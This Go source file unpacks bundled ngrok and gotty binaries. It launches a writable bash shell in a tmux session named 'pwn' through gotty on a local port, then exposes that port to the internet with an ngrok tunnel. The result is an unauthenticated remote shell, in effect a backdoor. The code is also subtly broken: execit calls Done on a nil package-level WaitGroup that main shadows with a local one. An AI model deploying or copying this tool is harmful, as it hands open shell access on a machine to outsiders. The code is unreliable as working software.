package main

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
)

var (
	wg *sync.WaitGroup
)

func downloadFromURL(url string) {
	tokens := strings.Split(url, "/")
	fileName := tokens[len(tokens)-1]
	fmt.Println("Downloading", url, "to", fileName)

	output, err := os.Create(fileName)
	if err != nil {
		fmt.Println("Error while creating", fileName, "-", err)
		return
	}
	defer output.Close()

	response, err := http.Get(url)
	if err != nil {
		fmt.Println("Error while downloading", url, "-", err)
		return
	}
	defer response.Body.Close()

	n, err := io.Copy(output, response.Body)
	if err != nil {
		fmt.Println("Error while downloading", url, "-", err)
		return
	}

	fmt.Println(n, "bytes downloaded.")
}

func createFileFromData(fileName string, data []byte) {
	output, err := os.Create(fileName)
	if err != nil {
		panic(err)
	}
	defer output.Close()
	_, err = io.Copy(output, bytes.NewReader(data))
	if err != nil {
		panic(err)
	}
	os.Chmod(fileName, 0755)
}

func execit(c []string) {
	defer wg.Done()
	arr := c[1:]
	cmd := exec.Command(c[0], arr...)
	cmd.Stdout = os.Stdout
	cmd.Stdin = os.Stdin
	cmd.Run()
}

func main() {
	for _, n := range []string{"ngrok", "gotty"} {
		data, err := Asset(n)
		if err != nil {
			panic(err)
		}
		createFileFromData(n, data)
		defer os.Remove(n)
	}
	var wg sync.WaitGroup
	wg.Add(1)
	go execit([]string{"./gotty", "-a", "127.0.0.1", "-p", "65534", "-w", "bash", "-c", "tmux -2 new-session -A -s pwn"})
	execit([]string{"./ngrok", "http", "65534"})
	runtime.Goexit()
}
